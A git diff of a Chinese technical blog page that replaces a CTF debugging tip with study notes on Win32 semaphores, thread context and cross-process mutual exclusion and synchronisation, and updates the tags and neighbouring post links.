-<h1 id="技巧总结"><a href="#技巧总结" class="headerlink" title="技巧总结"></a>技巧总结</h1><h2 id="调试交互"><a href="#调试交互" class="headerlink" title="调试交互"></a>调试交互</h2><ul>
-<li><p>调试时需要输入payload通常含有一些不可打印字符 直接复制粘贴不好使</p>
-<p>则在发送payload之前先使用pause()</p>
-<p>在gdb下完断点后继续执行</p>
+<li><p>Q: 什么时候会用到手冲模式呢?</p>
+</li>
+<li><p>A: 一般情况不会用到, 除非想让大家任意访问, 但这样存在的意义也不大了, 所以一般都是关闭手冲模式的, 来实现互斥用的</p>
 </li>
 </ul>
+<h2 id="信号量-Semaphore"><a href="#信号量-Semaphore" class="headerlink" title="信号量 Semaphore"></a>信号量 Semaphore</h2><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">//创建
+HANDLE g_Semaphore = HANDLE CreateSemaphore(		
+		
+  LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,		
+		
+  LONG lInitialCount,		//初始发放资源数目
+		
+  LONG lMaximumCount,		//最大并行资源数目
+		
+  LPCTSTR lpName		
+		
+);		
+
+//申请一个空闲区域, 信号量第二个参数-1
+WaitForSingleObject(g_Semaphore, INFINITE);
+
+//释放,第二个参数表示释放后空闲的资源数目
+ReleaseSemaphore(g_Semaphore, 1, NULL)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="线程Context"><a href="#线程Context" class="headerlink" title="线程Context"></a>线程Context</h2><p>线程之间互相切换的时候状态</p>
+<p>这个结构就有了保存其线程寄存器状态的作用</p>
+<p>使用方法</p>
+<ul>
+<li>先定义CONTEXT结构 依据想要获取的值对成员<code>ContextFlags</code>进行赋值</li>
+<li>调用GetThreadContext, 就可以在定义的CONTEXT结构看到想要的寄存信息了</li>
+</ul>
+<p>进程就是4GB 线程就是EIP</p>
+<h1 id="跨进程的互斥和同步"><a href="#跨进程的互斥和同步" class="headerlink" title="跨进程的互斥和同步"></a>跨进程的互斥和同步</h1><p><strong>互斥</strong>就是同一时刻不同访问</p>
+<p><strong>同步</strong>就是在一个执行之前需要保证另外一个优先执行 也就是要达到按序访问的目的</p>
+<p>在学到的内核对象中 做一些小总结</p>
+<h2 id="实现互斥的工具"><a href="#实现互斥的工具" class="headerlink" title="实现互斥的工具"></a>实现互斥的工具</h2><p>单进程可以有临界区 或者自己实现</p>
+<p>这里主要还是讨论跨进程的内核对象</p>
+<p>互斥体, 事件, 信号量都可以作互斥</p>
+<ul>
+<li>互斥体: 作用和最基本的临界区一致</li>
+<li>事件: 在临界区功能的基础上, 能够实现简单的进程同步(例如利用两个事件来解决生产者-消费者问题)</li>
+<li>信号量: 在可以实现临界区的基础上, 信号量更加灵活, 例如可以同时让有限个线程进入临界区</li>
+</ul>
+<h2 id="实现同步的工具"><a href="#实现同步的工具" class="headerlink" title="实现同步的工具"></a>实现同步的工具</h2><ul>
+<li>事件: 在临界区功能的基础上, 能够实现简单的进程同步(例如利用两个事件来解决生产者-消费者问题)</li>
+<li>学习中</li>
+</ul>
+<blockquote>
+<p>近期重新整理</p>
+</blockquote>
 
                 
             </div>
@@ -682,7 +623,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://luluting.github.io/2021/12/28/pwn-prac/">http://luluting.github.io/2021/12/28/pwn-prac/</a>
+                    <a href="http://luluting.github.io/2021/11/20/win32/">http://luluting.github.io/2021/11/20/win32/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -720,12 +661,8 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Pwn/">
-                                    <span class="chip bg-color">Pwn</span>
-                                </a>
-                            
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
+                                <a href="/tags/WIN32/">
+                                    <span class="chip bg-color">WIN32</span>
                                 </a>
                             
                         </div>
@@ -775,30 +712,32 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/02/28/afl/">
+                <a href="/2021/11/20/hook/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/uni2.jpg" class="responsive-img" alt="AFL工具探索">
+                        <img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/20191202150141.jpg" class="responsive-img" alt="Windows Hook">
                         
-                        <span class="card-title">AFL工具探索</span>
+                        <span class="card-title">Windows Hook</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            HOOK真的是非常有意思的一种技术
+能够掌握程序逻辑执行顺序的权利
+在这里记录一下HOOK的学习
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-28
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-20
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Vulnerability/" class="post-category">
-                                    Vulnerability
+                            <a href="/categories/Windows/" class="post-category">
+                                    Windows
                                 </a>
                             
                             
@@ -808,12 +747,8 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Fuzz/">
-                        <span class="chip bg-color">Fuzz</span>
-                    </a>
-                    
-                    <a href="/tags/Linux/">
-                        <span class="chip bg-color">Linux</span>
+                    <a href="/tags/Hook/">
+                        <span class="chip bg-color">Hook</span>
                     </a>
                     
                 </div>
@@ -827,30 +762,30 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/12/11/number-theory/">
+                <a href="/2021/11/20/pvz/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/72908383_p0.png" class="responsive-img" alt="数论">
+                        <img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/20191203120133.jpg" class="responsive-img" alt="PlantsVsZombies逆向相关">
                         
-                        <span class="card-title">数论</span>
+                        <span class="card-title">PlantsVsZombies逆向相关</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            记录在逆向PVZ中的一些过程
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-11
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-20
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Course/" class="post-category">
-                                    Course
+                            <a href="/categories/Game/" class="post-category">
+                                    Game
                                 </a>
                             
                             
@@ -860,8 +795,12 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Math/">
-                        <span class="chip bg-color">Math</span>
+                    <a href="/tags/Hook/">
+                        <span class="chip bg-color">Hook</span>
+                    </a>
+                    
+                    <a href="/tags/MOD/">
+                        <span class="chip bg-color">MOD</span>
                     </a>
                     
                 </div>
